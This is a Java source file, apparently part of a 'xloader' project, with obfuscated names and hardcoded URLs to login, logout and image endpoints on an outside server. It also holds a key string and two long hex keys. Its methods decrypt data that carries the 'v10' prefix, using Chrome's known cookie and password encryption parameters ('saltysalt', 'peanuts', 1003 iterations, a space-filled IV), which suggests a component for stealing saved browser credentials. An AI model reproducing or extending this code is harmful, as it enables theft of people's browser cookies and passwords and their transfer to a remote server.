package net.youtoolife.test.xloader;

import java.util.Arrays;

import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * Created by youtoolife on 5/19/18.
 */

public class XA {

    public static final String A = "http://ytl.96.lt/fcm_db/login.php";
    public static final String AA = "http://ytl.96.lt/fcm_db/logout.php";
    public static final String B = "683asdf29ggsd123udkywnxtutruernf";
    
    public static final String C = "http://ytl.96.lt/fcm_db/get_img.php";

    public static final String MA = "00:eb:14:e0:5e:a0:f0:4f:33:db:59:d7:27:10:9e:e4:9d:53:ee:cb:6"
            + "b:2d:96:44:64:bd:37:2c:1b:68:7b:98:5f:11:99:1f:1a:49:a2:2a:72:13:36:98:54:c"
            + "5:23:44:cc:07:73:d5:d4:19:64:ad:ad:bd:bc:8a:38:e5:a8:b5:c3:95:71:ff:d3:50:40"
            + ":26:60:6f:91:12:0b:b2:9e:bf:b1:7a:92:a7:ea:29:2f:85:51:3c:f4:b3:55:f7:62:1f:11"
            + ":69:20:94:0a:f2:c8:df:bf:5b:fe:4e:12:7a:5f:81:20:25:4f:b9:a8:d3:74:16:7f:f4:5c"
            + ":2d:c8:9a:ad:d9:c9:2f:30:45:43:76:82:03:64:29:9e:0f:24:54:ed:0b:b0:2f:91:df:7d"
            + ":46:b9:23:53:e6:a0:25:2f:bc:e0:60:a2:b5:20:41:a8:ef:21:8c:59:3b:36:12:ea:cb:46"
            + ":c2:94:4f:59:61:ae:56:8c:6e:2a:aa:c3:99:1d:ba:5e:44:d7:91:37:52:05:25:a6:ed:0b"
            + ":fd:79:81:e1:60:63:a9:32:ee:63:9e:8d:d7:fa:57:e4:40:36:ed:80:0c:87:2e:3d:5f:02"
            + ":80:b9:be:4a:89:01:2c:89:0e:4b:a2:4d:6f:08:14:50:ac:6a:14:ac:ac:6c:cb:63:0a:2c"
            + ":5b:67:72:8f";
    public static final String EA = "00:9d:cc:ad:af:d7:a8:78:01:ff:44:17:40:89:cf:9e:f6:5c:d8:f6:83:43:5e"
            + ":93:1a:6c:49:14:ba:71:30:45:df:cb:18:55:e0:77:7c:fb:b1:07:64:a6:6c:80:c8:63:ed"
            + ":f1:32:b8:5e:5f:8d:4d:68:4a:ec:bc:7b:e4:ed:92:d5:6f:03:cf:0e:31:d8:5d:ea:6d:f9"
            + ":9b:7b:6e:b3:51:49:f9:55:68:91:ae:83:cf:a1:f0:a0:f1:a0:cb:26:7a:64:5d:85:18:db"
            + ":20:8d:e6:63:b5:84:c7:33:70:21:9b:b3:d0:57:eb:f0:7f:c0:75:39:fe:f5:c1:65:df:2e"
            + ":c3:f9:16:f2:7d:a1:59:19:2e:92:bd:65:a1:f2:b4:0a:6f:0f:6d:6b:a6:f6:89:9f:ec:93"
            + ":0f:ff:08:42:32:06:91:cb:0d:5f:3b:ce:8f:06:21:37:a2:a4:76:f4:40:c5:99:5d:93:22:"
            + "1c:ab:6a:ab:c3:0f:23:11:ef:40:97:cf:65:1b:7b:55:7c:aa:f4:46:2e:fc:90:6b:3d:e6:"
            + "53:11:7a:0a:94:16:6b:e5:56:b8:f0:1b:41:50:c0:02:f1:34:c3:ec:cf:04:cf:ac:76:fc"
            + ":8f:bf:f4:89:4c:96:11:d6:f4:07:4b:4a:19:6f:56:6e:68:fb:62:9b:44:54:a1:ff:6c:01";


    public static String b(String eb) {
        String b = null;
        try {
            byte[] salt = "saltysalt".getBytes();
            char[] password = "peanuts".toCharArray();
            char[] iv = new char[16];
            Arrays.fill(iv, ' ');
            int keyLength = 16;
            int iterations = 1003;
            PBEKeySpec spec = new PBEKeySpec(password, salt, iterations, keyLength * 8);
            SecretKeyFactory pbkdf2 = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
            byte[] aesKey = pbkdf2.generateSecret(spec).getEncoded();
            SecretKeySpec keySpec = new SecretKeySpec(aesKey, "AES");
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            
            byte[] encryptedBytes = stb(eb);//("UTF-8");
            
            if (new String(encryptedBytes).startsWith("v10")) {
                encryptedBytes = Arrays.copyOfRange(encryptedBytes, 3, encryptedBytes.length);
            }
            cipher.init(Cipher.DECRYPT_MODE, keySpec, new IvParameterSpec(new String(iv).getBytes()));
            byte[] decryptedBytes = cipher.doFinal(encryptedBytes);
            b = new String(decryptedBytes, "UTF-8");
        }catch (Exception e) {
            System.out.println(e.getMessage());
        }
        return b;
    }
    
    public static String bts(byte[] ba) {
    	String s = "public static final byte[] A = {";
    	for (int i = 0; i < ba.length; i++) {
    		if (i < (ba.length-1))
    			s += String.valueOf(ba[i])+",";
    		else
    			s += String.valueOf(ba[i]) + "};";
    		if (i % 15 == 0)
    			s+= '\n';
    	}
    	return s;
    }
    
    public static byte[] stb(String s) {
    	String[] bl = s.split(",");
    	byte[] ba = new byte[bl.length];
    	for (int i = 0; i < bl.length; i++) {
    		ba[i] = Integer.valueOf(bl[i]).byteValue();
    	}
    	return ba;
    }

    public static String a(String t) {
        String a = null;
        try {
            byte[] salt = "saltysalt".getBytes();
            char[] password = "peanuts".toCharArray();
            char[] iv = new char[16];
            Arrays.fill(iv, ' ');
            int keyLength = 16;
            int iterations = 1003;
            PBEKeySpec spec = new PBEKeySpec(password, salt, iterations, keyLength * 8);
            SecretKeyFactory pbkdf2 = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
            byte[] aesKey = pbkdf2.generateSecret(spec).getEncoded();
            SecretKeySpec keySpec = new SecretKeySpec(aesKey, "AES");
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, keySpec, new IvParameterSpec(new String(iv).getBytes()));
            byte[] encryptBytes0 = cipher.doFinal(t.getBytes("UTF-8"));
            //System.out.println(new String(encryptBytes0));
            a = bts(encryptBytes0);
        }
        catch (Exception e) {
            System.out.println(e.getMessage());
        }
        return a;
    }

}
